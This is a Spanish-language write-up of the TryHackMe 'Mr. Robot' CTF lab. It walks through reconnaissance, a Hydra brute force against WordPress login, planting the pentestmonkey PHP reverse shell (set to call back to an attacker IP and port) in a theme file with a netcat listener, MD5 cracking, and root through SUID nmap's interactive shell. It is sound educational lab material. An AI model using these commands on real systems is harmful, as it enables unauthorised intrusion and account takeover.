# Mr. Robot CTF — TryHackMe

## Información de la máquina

| Característica | Descripción |
|---|---|
| Plataforma | TryHackMe |
| Máquina | Mr. Robot CTF |
| Sistema operativo | Linux |
| Dificultad | Principiante / Intermedio |
| IP objetivo | 10.64.132.79 |
| Máquina atacante | Kali Linux |
| Servicios identificados | SSH, HTTP, HTTPS |
| Herramientas | Nmap, Gobuster, WPScan, Burp Suite, Hydra, John the Ripper, Netcat y GTFOBins |
| Objetivo | Obtener las tres claves ocultas y conseguir acceso root |
| Estado | Completado |

**Enlace:** https://tryhackme.com/room/mrrobot

> Este writeup documenta las técnicas de reconocimiento, enumeración web, análisis de autenticación, explotación y escalada de privilegios utilizadas durante la resolución de Mr. Robot CTF, una máquina vulnerable disponible en TryHackMe. Todas las pruebas fueron realizadas dentro de un entorno de laboratorio autorizado con fines educativos.

## Descripción del laboratorio

Mr. Robot CTF es un laboratorio de pentesting inspirado en la serie de televisión Mr. Robot. El desafío consiste en investigar una máquina Linux vulnerable, identificar posibles vectores de ataque y obtener tres claves ocultas mediante diferentes técnicas de seguridad ofensiva.

Durante su resolución se aplicaron técnicas de enumeración de servicios, descubrimiento de directorios web, análisis de WordPress, ataques de diccionario, ejecución remota de código y escalada de privilegios.

El laboratorio permitió comprender cómo diferentes configuraciones inseguras pueden combinarse hasta comprometer completamente un sistema.

## Objetivos del laboratorio

- Identificar los servicios expuestos mediante técnicas de reconocimiento.
- Enumerar la aplicación web y descubrir archivos y directorios accesibles.
- Investigar el mecanismo de autenticación de WordPress.
- Identificar posibles credenciales mediante pruebas de diccionario.
- Obtener acceso inicial al sistema mediante una reverse shell.
- Enumerar usuarios, archivos y permisos del sistema Linux.
- Identificar configuraciones inseguras que permitan escalar privilegios.
- Obtener las tres claves del laboratorio.

## Metodología

Para resolver la máquina se siguieron las siguientes fases:

1. **Reconocimiento:** identificación de puertos abiertos y servicios mediante Nmap.
2. **Enumeración web:** descubrimiento de rutas, archivos y tecnologías con Gobuster y Curl.
3. **Enumeración de WordPress:** identificación del CMS y análisis de su formulario de autenticación.
4. **Explotación y acceso inicial:** obtención de credenciales, modificación de un archivo PHP y establecimiento de una reverse shell.
5. **Escalada de privilegios:** análisis de hashes, cambio de usuario y explotación de permisos SUID mediante Nmap.
6. **Conclusiones:** análisis de los hallazgos y recomendaciones de seguridad.

---

## 1. Reconocimiento

### Objetivo

Identificar los puertos abiertos, servicios activos y versiones de software presentes en la máquina objetivo para determinar posibles vectores de ataque.

### Herramientas utilizadas

- Kali Linux
- Nmap
- Escaneo TCP SYN
- Scripts NSE de Nmap

### Procedimiento

**1. Escaneo de puertos y servicios**

Desde la terminal de Kali Linux, se ejecutó el siguiente comando:

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.64.132.79 -oN escaneo
```

Explicación de los parámetros:

- `-p-`: escanea todos los puertos TCP, desde el 1 hasta el 65535.
- `--open`: muestra los puertos identificados como abiertos.
- `-sS`: realiza un escaneo TCP SYN.
- `-sC`: ejecuta los scripts predeterminados de Nmap.
- `-sV`: identifica los servicios y sus versiones.
- `--min-rate 5000`: solicita una tasa mínima de 5000 paquetes por segundo.
- `-n`: evita la resolución de nombres DNS.
- `-vvv`: muestra información detallada durante el escaneo.
- `-Pn`: omite el descubrimiento previo del host.
- `-oN escaneo`: guarda los resultados en un archivo de texto llamado `escaneo`.

Este escaneo permitió identificar los servicios accesibles y obtener información sobre sus versiones.

**Evidencia 1: Ejecución del escaneo Nmap**

<img width="629" height="100" alt="image" src="https://github.com/user-attachments/assets/d66c18e4-0cfc-400e-9a9c-42c8262987f3" />

### Resultados del escaneo

Se identificaron tres puertos TCP abiertos:

| Puerto | Servicio | Versión identificada |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | HTTP | Apache httpd |
| 443/tcp | HTTPS | Apache httpd |

**Evidencia 2: Identificación de puertos y servicios**

<img width="632" height="434" alt="image" src="https://github.com/user-attachments/assets/56844ad6-9842-4a8a-94c3-f8890201df40" />

### Análisis de los servicios

**Puerto 22 — SSH**

Se identificó OpenSSH 8.2p1, utilizado para administrar sistemas de forma remota mediante conexiones cifradas.

En esta fase no se identificaron credenciales válidas para acceder mediante SSH.

**Puerto 80 — HTTP**

Se identificó un servidor Apache HTTP.

Este servicio representa una superficie de ataque relevante debido a que permite investigar aplicaciones web, formularios de autenticación, archivos expuestos y directorios accesibles.

**Puerto 443 — HTTPS**

Se identificó un segundo servicio web Apache utilizando SSL/TLS.

Este servicio permite establecer conexiones web cifradas y podría presentar funcionalidades similares a las del puerto 80.

### Resultado

El escaneo permitió identificar tres puertos TCP abiertos y sus servicios asociados.

Se decidió priorizar la enumeración del servicio HTTP para descubrir las tecnologías utilizadas y posibles recursos expuestos.

Durante esta fase no se identificó ninguna vulnerabilidad explotable.

### Conocimientos adquiridos

- Reconocimiento de puertos mediante Nmap.
- Identificación de servicios y versiones de software.
- Uso de scripts NSE para obtener información adicional.
- Interpretación de resultados de escaneo TCP.
- Identificación de superficies de ataque.
- Priorización de servicios durante una prueba de penetración.
- Diferencia entre reconocimiento y explotación.

## 2. Enumeración web

### Objetivo

Identificar recursos accesibles desde la aplicación web, descubrir directorios, archivos expuestos y tecnologías utilizadas para determinar posibles vectores de ataque.

### Herramientas utilizadas

- Kali Linux
- Firefox
- Curl
- Gobuster
- Wget
- Comandos: curl, gobuster, wget, cat, wc, sort

### Procedimiento

**1. Inspección inicial de la página principal**

Se accedió a la aplicación web mediante Firefox:

```text
http://10.64.152.79
```

La página mostraba una interfaz interactiva con apariencia de terminal, relacionada con la temática de Mr. Robot y fsociety.

Se identificaron comandos como `prepare`, `fsociety`, `inform`, `question`, `wakeup` y `join`.

Esta interfaz forma parte de la aplicación web y no representa una shell real del sistema operativo.

**Evidencia 3: Página principal de Mr. Robot CTF**

<img width="1919" height="503" alt="image" src="https://github.com/user-attachments/assets/e39eb0bf-e2d8-4afa-bcc3-75a6924c0590" />

**2. Análisis de cabeceras HTTP**

Se utilizó Curl para obtener las cabeceras HTTP del servidor:

```bash
curl -I http://10.64.152.79
```

El servidor respondió:

```text
HTTP/1.1 200 OK
Server: Apache
X-Frame-Options: SAMEORIGIN
X-Mod-Pagespeed: 1.9.32.3-4523
Content-Type: text/html
```

El código `200 OK` confirmó que el servidor respondió correctamente a la solicitud.

Se identificó Apache como servidor web y X-Mod-Pagespeed como componente de optimización.

**Evidencia 4: Cabeceras HTTP**

<img width="372" height="213" alt="image" src="https://github.com/user-attachments/assets/09820d6c-acb9-46f5-b010-2a367477d0d0" />

**3. Descubrimiento de directorios con Gobuster**

Se utilizó Gobuster para descubrir rutas y directorios de la aplicación:

```bash
gobuster dir -u http://10.64.152.79 -w /usr/share/wordlists/dirb/common.txt
```

Explicación de los parámetros:

- `dir`: activa el modo de descubrimiento de directorios.
- `-u`: indica la URL objetivo.
- `-w`: especifica el diccionario utilizado para probar rutas.

Se identificaron recursos como:

```text
/admin
/dashboard
/login
/readme
/license
/robots.txt
/index.html
/index.php
/phpmyadmin
```

También se identificaron redirecciones hacia rutas relacionadas con WordPress, como `/wp-admin/` y `/wp-login.php`.

El servidor devolvió diferentes códigos HTTP, entre ellos:

- `200`: el recurso respondió correctamente.
- `301`: redirección permanente.
- `302`: redirección temporal.
- `403`: acceso prohibido.

La presencia de rutas asociadas a WordPress permitió identificar este CMS como una tecnología relevante para continuar la enumeración.

**Evidencia 5: Enumeración con Gobuster**

<img width="683" height="864" alt="image" src="https://github.com/user-attachments/assets/e4cccd69-1edc-42ac-a5d2-1e5df18b1018" />

**4. Análisis del archivo robots.txt**

Durante la enumeración se descubrió el archivo `robots.txt`.

Se consultó su contenido mediante:

```bash
curl http://10.64.152.79/robots.txt
```

El servidor devolvió:

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

El archivo reveló dos recursos interesantes:

- `fsocity.dic`: diccionario de palabras proporcionado por el laboratorio.
- `key-1-of-3.txt`: archivo relacionado con la primera clave del desafío.

Este hallazgo demuestra que `robots.txt` puede revelar información sobre archivos no enlazados desde la página principal.

El archivo no constituye un mecanismo de protección ni impide el acceso a los recursos mencionados.

**Evidencia 6: Contenido de robots.txt**

<img width="382" height="98" alt="image" src="https://github.com/user-attachments/assets/94a92e31-f224-463f-a179-a4f5f0c7335b" />

**5. Descarga de la primera clave**

Se descargó el archivo descubierto durante la enumeración:

```bash
wget http://10.64.152.79/key-1-of-3.txt
```

El servidor respondió con el código `200 OK` y permitió descargar un archivo de 33 bytes.

Posteriormente, se consultó su contenido:

```bash
cat key-1-of-3.txt
```

Se obtuvo correctamente la primera clave del laboratorio. Su valor se omite del writeup para evitar revelar la solución.

**Evidencia 7: Obtención de la primera clave**

<img width="714" height="213" alt="image" src="https://github.com/user-attachments/assets/09339c8a-e1b7-4275-9710-8f2ecd3d6cad" />

**6. Descarga y análisis del diccionario fsocity.dic**

Se descargó el diccionario expuesto por el servidor:

```bash
wget http://10.64.152.79/fsocity.dic
```

La descarga se completó correctamente.

Posteriormente, se comprobó la cantidad de líneas:

```bash
wc -l fsocity.dic
```

Resultado:

```text
858160 fsocity.dic
```

El diccionario contenía numerosas entradas repetidas.

Para eliminar duplicados, se ejecutó:

```bash
sort -u fsocity.dic > fsocity-unique.txt
```

Posteriormente, se verificó la cantidad de entradas únicas:

```bash
wc -l fsocity-unique.txt
```

Resultado obtenido durante el análisis:

```text
11451 fsocity-unique.txt
```

Esta optimización permitió reducir considerablemente el número de entradas y preparar el diccionario para su posible utilización en pruebas posteriores.

**Evidencia 8: Descarga y optimización del diccionario**

<img width="615" height="340" alt="image" src="https://github.com/user-attachments/assets/91067403-29d8-4655-abf7-f9839a78ce64" />

### Hallazgos de seguridad

**1. Identificación de WordPress**

Las rutas encontradas permitieron identificar una aplicación WordPress, que será investigada durante la siguiente fase.

**2. Exposición de archivos mediante robots.txt**

El archivo `robots.txt` proporcionó referencias a recursos accesibles desde el servidor.

**3. Diccionario disponible públicamente**

El archivo `fsocity.dic` podía descargarse sin autenticación y proporcionaba una lista de palabras potencialmente útil para el laboratorio.

### Resultado

Se identificó una aplicación web alojada sobre Apache y se descubrieron diferentes rutas mediante Gobuster.

El análisis de `robots.txt` permitió localizar el archivo `key-1-of-3.txt`, obtener la primera clave del laboratorio y descargar el diccionario `fsocity.dic`.

Además, las rutas descubiertas proporcionaron indicios de una instalación de WordPress que será investigada durante la siguiente fase.

### Conocimientos adquiridos

- Inspección de aplicaciones web mediante Firefox.
- Análisis de cabeceras HTTP con Curl.
- Descubrimiento de directorios mediante Gobuster.
- Interpretación de códigos de estado HTTP.
- Identificación de tecnologías web.
- Análisis de archivos robots.txt.
- Descarga de recursos mediante Wget.
- Optimización de diccionarios utilizando sort y wc.
- Identificación de posibles exposiciones de información.

## 3. Enumeración y análisis de autenticación de WordPress

### Objetivo

Analizar la instalación de WordPress identificada durante la enumeración web, investigar el formulario de autenticación y comprobar posibles debilidades relacionadas con la enumeración de usuarios y las contraseñas.

### Herramientas utilizadas

- Kali Linux
- Firefox
- WPScan
- Burp Suite
- Hydra
- Diccionario fsocity-unique.txt

### Procedimiento

**1. Enumeración de WordPress mediante WPScan**

Después de identificar rutas relacionadas con WordPress durante la enumeración con Gobuster, se utilizó WPScan para recopilar información sobre la aplicación.

Se ejecutó el siguiente comando:

```bash
wpscan --url http://10.64.152.79 --enumerate u
```

Explicación de los parámetros:

- `wpscan`: herramienta especializada en el análisis de seguridad de WordPress.
- `--url`: especifica la dirección del sitio web.
- `--enumerate u`: intenta identificar usuarios registrados mediante diferentes técnicas de enumeración.

Durante el análisis, WPScan identificó el servidor Apache, el archivo `robots.txt` y la posible disponibilidad de XML-RPC.

En el análisis previo también se había identificado una instalación WordPress 4.3.1 con el tema Twenty Fifteen.

**Evidencia 9: Enumeración de WordPress con WPScan**

<img width="783" height="705" alt="image" src="https://github.com/user-attachments/assets/462da703-341f-46a7-890f-9324616ad43e" />

<img width="983" height="738" alt="image" src="https://github.com/user-attachments/assets/9bc6e2ee-152c-403b-9dfd-0e18b8069f89" />

**2. Identificación del formulario de autenticación**

Durante la enumeración con Gobuster se identificó la ruta `/wp-login.php`.

Se accedió al formulario desde Firefox:

```text
http://10.64.152.79/wp-login.php
```

La página solicitaba un nombre de usuario y una contraseña para iniciar sesión en WordPress.

**Evidencia 10: Formulario de autenticación WordPress**

<img width="1920" height="876" alt="image" src="https://github.com/user-attachments/assets/95d54e8e-425a-4b1f-a40b-d87e12c67d65" />

**3. Comprobación inicial de credenciales predeterminadas**

Como primera prueba manual, se intentó iniciar sesión utilizando las siguientes credenciales:

```text
Usuario: admin
Contraseña: admin
```

El servidor rechazó el intento y mostró el siguiente mensaje:

```text
ERROR: Invalid username.
```

Esto indicó que el nombre de usuario `admin` no era reconocido por la aplicación.

El mensaje también permitió identificar una posible debilidad de enumeración de usuarios, debido a que WordPress revelaba información sobre la existencia de las cuentas.

**Evidencia 11: Comprobación de credenciales admin:admin**

<img width="432" height="584" alt="image" src="https://github.com/user-attachments/assets/766d4f23-b106-4635-8c02-49603b63588a" />

**4. Análisis del formulario mediante Burp Suite**

Para comprender cómo WordPress procesaba los intentos de autenticación, se interceptó una solicitud HTTP mediante Burp Suite.

La solicitud utilizaba el método POST sobre la siguiente ruta:

```text
POST /wp-login.php HTTP/1.1
```

En el cuerpo de la solicitud se identificaron los siguientes parámetros:

```text
log=admin
pwd=admin
wp-submit=Log+In
redirect_to=...
testcookie=1
```

Explicación:

- `log`: nombre del parámetro que recibe el usuario.
- `pwd`: parámetro correspondiente a la contraseña.
- `wp-submit`: indica la acción de inicio de sesión.
- `redirect_to`: define la ruta de destino después de autenticarse.
- `testcookie`: participa en la comprobación de cookies del navegador.

Esta información permitió comprender cómo se enviaban las credenciales al servidor y preparar las siguientes pruebas de autenticación.

**Evidencia 12: Análisis de la solicitud POST con Burp Suite**

<img width="1059" height="343" alt="image" src="https://github.com/user-attachments/assets/a5ef23dc-b799-40a9-a312-e02b7a3940c2" />

### Hallazgos de seguridad

**1. Enumeración de usuarios mediante mensajes de error**

El formulario de WordPress devolvió el mensaje `Invalid username` cuando se probaron credenciales con un nombre de usuario inexistente.

Esta diferencia en las respuestas puede permitir identificar cuentas válidas y facilitar ataques posteriores contra el mecanismo de autenticación.

**2. Exposición del formulario de autenticación**

Se identificó el formulario `/wp-login.php`, accesible desde el servicio web.

La existencia de este formulario no constituye por sí misma una vulnerabilidad, pero representa una superficie de ataque que debe analizarse.

**3. Riesgos asociados con contraseñas débiles**

El uso de diccionarios permite comprobar si una cuenta utiliza contraseñas previsibles.

El impacto de este riesgo depende de los mecanismos de autenticación y las protecciones implementadas por el servidor.

### Resultado

Se identificó la aplicación WordPress y se analizó su formulario de autenticación mediante WPScan, Firefox y Burp Suite.

Durante la prueba inicial con las credenciales `admin:admin`, el servidor devolvió un mensaje que permitió identificar una posible debilidad de enumeración de usuarios.

Posteriormente, se realizaron pruebas de usuarios y contraseñas mediante Hydra utilizando listas de candidatos y el diccionario preparado durante la fase anterior.

La confirmación de credenciales válidas y del acceso al panel administrativo se documentará con las evidencias correspondientes.

### Conocimientos adquiridos

- Enumeración de WordPress mediante WPScan.
- Identificación de formularios de autenticación.
- Análisis de mensajes de error.
- Enumeración de usuarios.
- Interceptación de solicitudes HTTP con Burp Suite.
- Identificación de parámetros HTTP POST.
- Funcionamiento de ataques de diccionario.
- Uso de Hydra para pruebas de autenticación en laboratorios autorizados.
- Importancia de validar los resultados de herramientas automatizadas.

---

## 4. Explotación y acceso inicial

### Objetivo

Obtener acceso inicial a la máquina objetivo mediante el aprovechamiento de las credenciales de WordPress y la posibilidad de modificar archivos PHP desde el panel administrativo.

### Herramientas utilizadas

- Kali Linux
- Hydra
- Firefox
- WordPress
- PHP
- Netcat
- Repositorio de GitHub: pentestmonkey/php-reverse-shell

### Procedimiento

**1. Identificación de credenciales válidas mediante Hydra**

Durante la enumeración del formulario de WordPress se observó que la aplicación mostraba mensajes diferentes dependiendo de si un usuario existía o no.

Inicialmente se realizaron pruebas de enumeración de usuarios utilizando Hydra y una contraseña de prueba.

Esto permitió identificar el usuario `elliot`, cuya existencia fue confirmada posteriormente mediante el mensaje de contraseña incorrecta mostrado por WordPress.

Una vez identificado el usuario, se utilizó el diccionario `fsocity-unique.txt` para probar posibles contraseñas.

Se ejecutó el siguiente comando:

```bash
hydra -l elliot -P fsocity-unique.txt 10.64.152.79 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered" -t 4 -f
```

Explicación de los parámetros:

- `-l elliot`: especifica el nombre de usuario identificado.
- `-P fsocity-unique.txt`: indica el diccionario de contraseñas.
- `http-post-form`: utiliza el módulo de autenticación mediante formularios HTTP POST.
- `/wp-login.php`: ruta que procesa las solicitudes de autenticación.
- `log=^USER^`: parámetro utilizado para enviar el usuario.
- `pwd=^PASS^`: parámetro utilizado para enviar la contraseña.
- `F=The password you entered`: cadena utilizada para identificar una autenticación fallida.
- `-t 4`: utiliza cuatro tareas concurrentes.
- `-f`: detiene el proceso cuando se identifica un resultado positivo.

Hydra identificó una combinación válida, que posteriormente se comprobó mediante el formulario de inicio de sesión.

La contraseña recuperada se omite intencionalmente del writeup.

**Evidencia 13: Identificación de credenciales mediante Hydra**

<img width="1680" height="202" alt="image" src="https://github.com/user-attachments/assets/d1b32741-c2cd-427c-94bd-e333585b94d9" />
<img width="1672" height="247" alt="image" src="https://github.com/user-attachments/assets/508940e2-df1b-42c7-8348-ce8f1641e255" />

**2. Acceso al panel administrativo de WordPress**

Utilizando las credenciales recuperadas, se inició sesión en WordPress y se accedió al panel administrativo:

```text
http://10.64.152.79/wp-admin/
```

Se confirmó el acceso al panel de WordPress 4.3.1, que utilizaba el tema Twenty Fifteen.

Durante la exploración del panel se identificó la opción `Appearance`, que permitía acceder al editor de archivos del tema.

Esta funcionalidad resultó relevante porque permitía modificar archivos PHP que posteriormente serían interpretados por el servidor web.

**3. Identificación del editor de temas**

Desde el panel administrativo se accedió a:

```text
Appearance → Editor
```

Dentro del editor se seleccionó el tema `Twenty Fifteen` y posteriormente el archivo:

```text
archive.php
```

Este archivo forma parte de las plantillas PHP utilizadas por WordPress para mostrar páginas de archivo.

El editor permitía modificar su contenido y guardar los cambios mediante el botón `Update File`.

Esta capacidad de edición representaba un posible vector de ejecución de código PHP en el servidor.

**4. Obtención de una reverse shell PHP**

Para preparar el acceso inicial se utilizó el repositorio público de GitHub `pentestmonkey/php-reverse-shell`:

<img width="1920" height="866" alt="image" src="https://github.com/user-attachments/assets/5799f7fd-6e25-4309-bce6-d0b9999689ce" />

<img width="1920" height="875" alt="image" src="https://github.com/user-attachments/assets/1ce1c3e8-cad8-427a-b815-46580b882e2a" />

Se revisó el archivo `php-reverse-shell.php`, que contiene una implementación de reverse shell escrita en PHP.

Una reverse shell permite que la máquina objetivo establezca una conexión hacia el equipo atacante, proporcionando acceso a una sesión de comandos.

En el script se configuraron la dirección IP de la interfaz VPN de Kali Linux y el puerto de escucha:

```php
$ip = '192.168.193.58';
$port = 443;
```

El parámetro `$ip` define la dirección de destino de la conexión inversa y `$port` indica el puerto utilizado.

En este caso se utilizó el puerto 443 para recibir la conexión en Kali Linux.

**5. Modificación del archivo archive.php**

Desde la sección `Appearance → Editor` se reemplazó el contenido del archivo `archive.php` con el código PHP de la reverse shell obtenido del repositorio.

Posteriormente, se guardaron los cambios mediante `Update File`.

WordPress mostró el siguiente mensaje:

```text
File edited successfully.
```

Esto confirmó que el archivo PHP había sido modificado desde el panel administrativo.

**Evidencia 14: Modificación del archivo archive.php**

<img width="1920" height="859" alt="image" src="https://github.com/user-attachments/assets/947bbaed-9244-4843-a65d-14413bb662f2" />

<img width="1774" height="715" alt="image" src="https://github.com/user-attachments/assets/166bbd2c-4fee-46ac-a5a3-8f114dcfc05d" />

**6. Preparación del listener con Netcat**

Desde Kali Linux se preparó un listener utilizando Netcat:

```bash
nc -lvnp 443
```

Explicación del comando:

- `nc`: ejecuta Netcat.
- `-l`: habilita el modo de escucha.
- `-v`: muestra información detallada.
- `-n`: evita la resolución DNS.
- `-p 443`: establece el puerto de escucha.

El listener quedó esperando una conexión entrante desde la máquina objetivo.

**7. Ejecución del archivo PHP modificado**

Con el listener preparado, se accedió desde Firefox a la ruta correspondiente al archivo PHP modificado:

```text
http://10.64.152.79/wp-content/themes/twentyfifteen/archive.php
```

Al solicitar esta dirección, el servidor procesó el archivo `archive.php` que había sido modificado anteriormente.

El navegador mostró una página en blanco, mientras que el listener de Netcat recibió una conexión entrante desde la máquina objetivo.

Esto permitió obtener una sesión de comandos mediante reverse shell.

**8. Verificación del acceso inicial**

Después de recibir la conexión en Netcat, se ejecutaron comandos para identificar el usuario y el sistema comprometido:

```bash
whoami
id
hostname
```

El comando `whoami` devolvió:

```text
daemon
```

Posteriormente, `id` confirmó que la sesión pertenecía al usuario `daemon`:

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

También se identificó el nombre de host de la máquina objetivo.

Estos resultados confirmaron que se había obtenido acceso inicial al sistema operativo, aunque todavía sin privilegios de root.

**Evidencia 15: Obtención de la reverse shell**

<img width="635" height="268" alt="image" src="https://github.com/user-attachments/assets/b6aac9f4-3c69-4b6f-a3a8-d1769966f1af" />

### Hallazgos de seguridad

**1. Credenciales susceptibles a un ataque de diccionario**

Se consiguió identificar una combinación válida de usuario y contraseña utilizando el diccionario proporcionado por el laboratorio.

Esto demuestra el riesgo asociado con contraseñas que pueden recuperarse mediante listas de palabras conocidas.

**2. Modificación de archivos PHP desde WordPress**

El acceso al editor del tema permitió modificar el archivo `archive.php`.

Esta funcionalidad puede representar un riesgo importante cuando un atacante obtiene acceso a una cuenta con permisos suficientes para editar archivos ejecutables.

**3. Ejecución remota de código mediante un archivo del tema**

Después de modificar el archivo PHP y solicitar su ruta desde el navegador, el servidor ejecutó el contenido y estableció una conexión inversa hacia Kali Linux.

Esto permitió obtener una shell bajo el contexto del usuario `daemon`.

### Resultado

Se consiguió acceso inicial a la máquina Mr. Robot CTF mediante el aprovechamiento de una cuenta válida de WordPress y la modificación de un archivo PHP del tema Twenty Fifteen.

Se utilizó una reverse shell PHP obtenida del repositorio de pentestmonkey y se configuró para establecer una conexión hacia Kali Linux por el puerto 443.

Tras modificar `archive.php` desde el editor de temas y solicitar su dirección desde Firefox, Netcat recibió una conexión entrante.

Los comandos `whoami` e `id` confirmaron que se obtuvo una sesión con el usuario `daemon`.

El acceso inicial se completó correctamente. La siguiente fase consistirá en investigar el sistema Linux y buscar posibles vectores de escalada de privilegios.

### Conocimientos adquiridos

- Identificación de credenciales mediante ataques de diccionario.
- Validación de resultados de Hydra.
- Enumeración del panel administrativo de WordPress.
- Identificación de permisos de edición sobre archivos PHP.
- Funcionamiento de las reverse shells.
- Uso de repositorios públicos de herramientas de pentesting.
- Configuración de direcciones IP y puertos de conexión inversa.
- Uso de Netcat para recibir conexiones.
- Ejecución de código PHP desde un servidor web.
- Identificación de usuarios y privilegios mediante `whoami` e `id`.
- Diferencia entre acceso inicial y escalada de privilegios.

---

## 5. Escalada de privilegios

### Objetivo

Escalar privilegios desde el usuario `daemon` hasta obtener acceso como `root`, mediante la identificación de credenciales de otro usuario y la explotación de una configuración insegura de permisos SUID.

### Herramientas utilizadas

- Kali Linux
- Python
- John the Ripper
- Nmap
- GTFOBins
- Comandos: ls, cd, cat, nano, john, su, whoami, id, find, nmap

### Procedimiento

**1. Enumeración del sistema y descubrimiento del usuario robot**

Después de obtener acceso inicial mediante la reverse shell, se comenzó a explorar el sistema Linux desde la cuenta `daemon`.

Se enumeraron los directorios disponibles y posteriormente se accedió a la carpeta `/home`:

```bash
ls
cd /home
ls
```

Se identificó un directorio perteneciente al usuario `robot`.

Posteriormente, se accedió a dicho directorio:

```bash
cd /home/robot
ls -la
```

Durante la enumeración se encontró el archivo `password.raw-md5`.

Para analizar su contenido se ejecutó:

```bash
cat password.raw-md5
```

El archivo contenía el nombre de usuario `robot` acompañado de un hash MD5.

Este hallazgo resultó relevante porque permitía investigar la posibilidad de recuperar una contraseña asociada a dicho usuario.

**Evidencia 16: Descubrimiento del hash MD5**

<img width="367" height="546" alt="image" src="https://github.com/user-attachments/assets/c9b4cc97-57a0-4bba-9516-47d8f5fc8e69" />

**2. Recuperación de la contraseña mediante John the Ripper**

Para analizar el hash desde Kali Linux, se creó un archivo llamado `md5.hash` y se copió en él el valor obtenido anteriormente.

```bash
nano md5.hash
```

Una vez preparado el archivo, se utilizó John the Ripper junto con el diccionario optimizado durante la enumeración web:

```bash
john md5.hash --wordlist=fsocity-unique.txt --format=Raw-MD5
```

Explicación del comando:

- `john`: ejecuta John the Ripper.
- `md5.hash`: archivo que contiene el hash que se desea analizar.
- `--wordlist=fsocity-unique.txt`: indica el diccionario de contraseñas candidatas.
- `--format=Raw-MD5`: especifica el formato del hash.

John compara el resultado de aplicar MD5 a las palabras candidatas con el hash original.

Posteriormente, se consultó la contraseña recuperada mediante:

```bash
john --show --format=Raw-MD5 md5.hash
```

La herramienta mostró una contraseña recuperada para el hash analizado.

**Evidencia 17: Recuperación de contraseña con John the Ripper**

<img width="625" height="206" alt="image" src="https://github.com/user-attachments/assets/9a0813c4-12a2-46d2-a1b7-6685344edda1" />

**3. Mejora de la shell y acceso al usuario robot**

Después de recuperar la contraseña, se regresó a la sesión obtenida mediante la reverse shell.

Para mejorar la interacción con la terminal se ejecutó:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Este comando utiliza el módulo `pty` de Python para iniciar Bash dentro de una pseudoterminal.

Esto facilita la ejecución de comandos interactivos que pueden presentar problemas en una shell básica.

Posteriormente, se intentó cambiar al usuario `robot`:

```bash
su robot
```

Cuando el sistema solicitó la contraseña, se introdujo la recuperada mediante John the Ripper.

El cambio de usuario se realizó correctamente.

Para comprobar la identidad de la nueva sesión se ejecutó:

```bash
whoami
id
```

Resultados:

```text
robot
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```

Esto confirmó que se había obtenido acceso al usuario `robot`.

**4. Obtención de la segunda clave**

Una vez autenticado como `robot`, se examinó el contenido de su directorio personal.

```bash
cd /home/robot
ls -la
```

Se identificó el archivo correspondiente a la segunda clave del laboratorio.

Posteriormente, se consultó su contenido:

```bash
cat key-2-of-3.txt
```

Se obtuvo correctamente la segunda clave de Mr. Robot CTF.

Su valor se omite del writeup.

**Evidencia 18: Acceso al usuario robot y segunda clave**

<img width="420" height="179" alt="image" src="https://github.com/user-attachments/assets/05062617-b1dc-42c8-acb3-5001d1fc1219" />

**5. Enumeración de binarios con permisos SUID**

Tras acceder al usuario `robot`, se comenzó a investigar posibles vías de escalada de privilegios.

Se realizó una búsqueda de ejecutables con el bit SUID activado:

```bash
find / -perm -4000 2>/dev/null
```

Explicación:

- `find /`: realiza una búsqueda desde la raíz del sistema.
- `-perm -4000`: identifica archivos con el bit SUID activado.
- `2>/dev/null`: descarta mensajes de error relacionados con permisos.

El bit SUID permite que un ejecutable se ejecute con los privilegios efectivos de su propietario.

Entre los binarios encontrados destacaron:

```text
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/local/bin/nmap
```

El ejecutable `/usr/local/bin/nmap` resultó especialmente interesante porque Nmap no suele requerir privilegios SUID de root en esta configuración.

**6. Identificación del vector de escalada mediante GTFOBins**

Después de identificar Nmap entre los binarios SUID, se consultó GTFOBins para investigar posibles mecanismos de escalada de privilegios.

Referencia:

[GTFOBins — Nmap](https://gtfobins.github.io/gtfobins/nmap/)

Durante la investigación se identificó que determinadas versiones antiguas de Nmap permiten ejecutar comandos del sistema mediante un modo interactivo.

Esta funcionalidad, combinada con una configuración SUID insegura, puede permitir la ejecución de una shell con privilegios elevados.

**7. Explotación de Nmap con permisos SUID**

Se ejecutó Nmap en modo interactivo:

```bash
nmap --interactive
```

La herramienta abrió su consola interactiva.

Desde dicha consola se utilizó:

```text
!sh
```

El prefijo `!` permite ejecutar un comando del sistema desde la consola interactiva de Nmap.

Debido a que el ejecutable disponía de permisos SUID y pertenecía a root, se consiguió iniciar una shell con privilegios elevados.

Para comprobar el resultado se ejecutó:

```bash
whoami
```

Resultado:

```text
root
```

Esto confirmó que la escalada de privilegios se había realizado correctamente.

**Evidencia 19: Escalada de privilegios mediante Nmap**

<img width="420" height="179" alt="image" src="https://github.com/user-attachments/assets/f62c64f9-e064-42e7-bb73-7ec672044b56" />

**8. Obtención de la tercera clave**

Una vez obtenidos privilegios de root, se accedió al directorio `/root`:

```bash
cd /root
ls -la
```

Durante la enumeración se identificó el archivo:

```text
key-3-of-3.txt
```

Finalmente, se consultó su contenido:

```bash
cat key-3-of-3.txt
```

Se obtuvo la tercera y última clave del laboratorio, completando los objetivos principales de Mr. Robot CTF.

El valor de la clave se omite intencionalmente.

### Hallazgos de seguridad

**1. Exposición de credenciales mediante un hash MD5**

El archivo `password.raw-md5` contenía información de autenticación asociada al usuario `robot`.

El uso de un hash MD5 sin protecciones adecuadas representa un riesgo, especialmente cuando la contraseña puede recuperarse mediante ataques de diccionario.

**2. Configuración insegura de permisos SUID**

Durante la enumeración se identificó el ejecutable `/usr/local/bin/nmap` con el bit SUID activado.

Esta configuración permitió aprovechar funcionalidades del modo interactivo de Nmap para ejecutar comandos con privilegios elevados.

**3. Escalada de privilegios hasta root**

La combinación de una versión de Nmap con modo interactivo y permisos SUID permitió obtener una shell con privilegios de administrador.

### Resultado

Se consiguió acceder al usuario `robot` mediante la recuperación de una contraseña asociada a un hash MD5.

Posteriormente, se identificó una configuración insegura en el binario Nmap, que contaba con permisos SUID.

Mediante el modo interactivo de Nmap se ejecutó una shell con privilegios elevados y se confirmó el acceso como `root`.
